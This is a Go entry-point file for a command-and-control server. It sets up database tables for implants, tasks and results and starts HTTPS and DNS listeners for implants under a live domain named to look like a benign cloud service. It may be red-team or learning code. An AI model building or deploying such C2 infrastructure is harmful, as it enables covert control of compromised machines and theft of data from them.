package main

import (
	"asritha.dev/c2server/pkg/listener"
	"asritha.dev/c2server/pkg/model"
	"gorm.io/driver/postgres"
	"gorm.io/gorm"
	"log"
	"os"
)

const (
	DefaultCommProtocol = listener.HTTPS
	//	Domain              = "localhost"

	Domain = "cloud-docker.net"
)

func setupDB() *gorm.DB {
	dsn := os.Getenv("DATABASE_URL")
	db, err := gorm.Open(postgres.Open(dsn), &gorm.Config{})
	if err != nil {
		log.Fatalf("Failed to connect to database: %x", err)
	}
	if err = db.AutoMigrate(&model.Implant{}, &model.Task{}, &model.Result{}); err != nil {
		log.Fatalf("Database connected, but AutoMigrate failed: %v", err)
	}
	return db
}

func main() {
	db := setupDB()

	// httpsListener and dnsListener run concurrently under the same domain, each handling requests for implants using their respective protocols (HTTPS or DNS).
	httpsListener := listener.NewHTTPS(db, DefaultCommProtocol)
	httpsListener.Listen()

	dnsListener := listener.NewDNS(db, Domain)
	dnsListener.Listen()
}
